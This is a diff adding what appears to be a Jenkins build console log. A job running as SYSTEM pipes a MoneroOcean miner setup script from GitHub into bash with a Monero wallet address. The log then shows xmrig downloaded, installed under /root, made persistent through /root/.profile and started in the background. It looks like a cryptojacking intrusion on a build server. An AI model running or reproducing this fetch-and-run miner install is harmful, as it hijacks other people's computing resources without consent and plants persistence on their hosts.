@@ -1,0 +1,41 @@
+Started by user [8mha:////4NHeuUs+l/Vd7mUlclg7tdAy3FzNQydAmXsml/h3fok/AAAAmR+LCAAAAAAAAP9b85aBtbiIQTGjNKU4P08vOT+vOD8nVc83PyU1x6OyILUoJzMv2y+/JJUBAhiZGBgqihhk0NSjKDWzXb3RdlLBUSYGJk8GtpzUvPSSDB8G5tKinBIGIZ+sxLJE/ZzEvHT94JKizLx0a6BxUmjGOUNodHsLgAz2EgZe/dLi1CL9rNS87My8YgDGtiJjwgAAAA==[0mjenkins
+Running as SYSTEM
+Building in workspace /var/jenkins_home/workspace/aqyMU
+[aqyMU] $ /bin/sh -xe /tmp/jenkins4809725094583076764.sh
++ curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh
++ bash -s 49TYS1yBRmvD2HMv8FWFxq5XCAb4o4xF7BFBAFx25GszZuoX2F3odksY7EEqwd5SjVffPwa61raheAqPf5qZatV1P5JHzNT
+MoneroOcean mining setup script v2.11.
+(please report issues to support@moneroocean.stream email with full output of this script with extra "-x" "bash" option)
+
+WARNING: Generally it is not adviced to run this script under root
+main: line 71: type: bc: not found
+I will download, setup and run in background Monero CPU miner.
+If needed, miner in foreground can be started by /root/moneroocean/miner.sh script.
+Mining will happen to 49TYS1yBRmvD2HMv8FWFxq5XCAb4o4xF7BFBAFx25GszZuoX2F3odksY7EEqwd5SjVffPwa61raheAqPf5qZatV1P5JHzNT wallet.
+
+Since I can't do passwordless sudo, mining in background will started from your /root/.profile file first time you login this host after reboot.
+
+JFYI: This host has 6 CPU threads, so projected Monero hashrate is around 4 KH/s.
+
+Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)
+
+
+[*] Removing previous moneroocean miner (if any)
+bash: line 152: killall: command not found
+[*] Removing /root/moneroocean directory
+[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz
+#=#=#                                                                                                                                                    0.4%######################################################################## 100.0%
+[*] Unpacking /tmp/xmrig.tar.gz to /root/moneroocean
+[*] Checking if advanced version of /root/moneroocean/xmrig works fine (and not removed by antivirus software)
+[*] Miner /root/moneroocean/xmrig is OK
+[*] Creating /root/moneroocean/miner.sh script
+[*] Adding /root/moneroocean/miner.sh script to /root/.profile
+[*] Running miner in the background (see logs in /root/moneroocean/xmrig.log file)
+
+NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned
+HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/moneroocean/config.json
+sed -i 's/"max-threads-hint": *[^,]*,/"max-threads-hint": 75,/' $HOME/moneroocean/config_background.json
+
+[*] Setup complete
+Finished: SUCCESS
